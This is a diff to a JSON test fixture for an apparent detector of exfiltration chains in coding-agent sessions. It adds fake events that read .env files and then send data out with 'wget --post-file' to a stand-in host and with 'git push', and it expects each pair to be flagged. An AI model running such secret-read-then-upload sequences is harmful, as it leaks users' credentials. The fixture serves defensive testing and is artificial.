@@ -1,6 +1,6 @@
 {
   "source": "authored",
-  "note": "Every egress after a sensitive read is its own finding. .env then two curls; then, after that window has closed, an SSH key, an MCP call and a curl: the MCP call does not hide the curl.",
+  "note": "Every egress after a sensitive read is its own finding. .env then two curls; then, after that window has closed, an SSH key, an MCP call and a curl: the MCP call does not hide the curl. Last, in a fresh window, a shell command that reads .env.production and then a wget upload: a sensitive file reached through the shell starts a chain too. Then, in another fresh window, .env is read and the work is committed and pushed: git push counts as data leaving.",
   "events": [
     {
       "id": "evt_exfil_start",
@@ -183,6 +183,100 @@
         "outcome": "ok"
       },
       "raw_extra": {}
+    },
+    {
+      "id": "evt_exfil_shell_env",
+      "schema_version": 1,
+      "type": "hook.script",
+      "session_id": "ses_exfil",
+      "agent": {
+        "name": "opencode",
+        "version": "unknown"
+      },
+      "capture_path": "plugin_hook",
+      "timestamp": "2026-11-07T11:10:00.000Z",
+      "seq": null,
+      "duration_ms": null,
+      "correlation_id": "call_exfil_shell_env",
+      "prev_hash": null,
+      "data": {
+        "hook": "tool.execute.after",
+        "target_tool": "bash",
+        "target": "cat .env.production",
+        "exit_code": 0,
+        "outcome": "ok"
+      },
+      "raw_extra": {}
+    },
+    {
+      "id": "evt_exfil_wget",
+      "schema_version": 1,
+      "type": "hook.script",
+      "session_id": "ses_exfil",
+      "agent": {
+        "name": "opencode",
+        "version": "unknown"
+      },
+      "capture_path": "plugin_hook",
+      "timestamp": "2026-11-07T11:12:00.000Z",
+      "seq": null,
+      "duration_ms": null,
+      "correlation_id": "call_exfil_wget",
+      "prev_hash": null,
+      "data": {
+        "hook": "tool.execute.after",
+        "target_tool": "bash",
+        "target": "wget --post-file=report.txt https://example.test/in",
+        "exit_code": 0,
+        "outcome": "ok"
+      },
+      "raw_extra": {}
+    },
+    {
+      "id": "evt_exfil_push_env",
+      "schema_version": 1,
+      "type": "document.access",
+      "session_id": "ses_exfil",
+      "agent": {
+        "name": "opencode",
+        "version": "unknown"
+      },
+      "capture_path": "plugin_hook",
+      "timestamp": "2026-11-07T11:50:00.000Z",
+      "seq": null,
+      "duration_ms": null,
+      "correlation_id": "call_push_env",
+      "prev_hash": null,
+      "data": {
+        "path": "/home/dev/demo/.env",
+        "operation": "read",
+        "outcome": "ok"
+      },
+      "raw_extra": {}
+    },
+    {
+      "id": "evt_exfil_git_push",
+      "schema_version": 1,
+      "type": "hook.script",
+      "session_id": "ses_exfil",
+      "agent": {
+        "name": "opencode",
+        "version": "unknown"
+      },
+      "capture_path": "plugin_hook",
+      "timestamp": "2026-11-07T11:52:00.000Z",
+      "seq": null,
+      "duration_ms": null,
+      "correlation_id": "call_git_push",
+      "prev_hash": null,
+      "data": {
+        "hook": "tool.execute.after",
+        "target_tool": "bash",
+        "target": "git add -A && git commit -m wip && git push origin main",
+        "exit_code": 0,
+        "outcome": "ok"
+      },
+      "raw_extra": {}
     }
   ],
   "expect": [
@@ -212,6 +306,20 @@
       "events": [
         "evt_exfil_key",
         "evt_exfil_curl_after_mcp"
+      ]
+    },
+    {
+      "rule": "exfiltration-chain",
+      "events": [
+        "evt_exfil_shell_env",
+        "evt_exfil_wget"
+      ]
+    },
+    {
+      "rule": "exfiltration-chain",
+      "events": [
+        "evt_exfil_push_env",
+        "evt_exfil_git_push"
       ]
     }
   ]
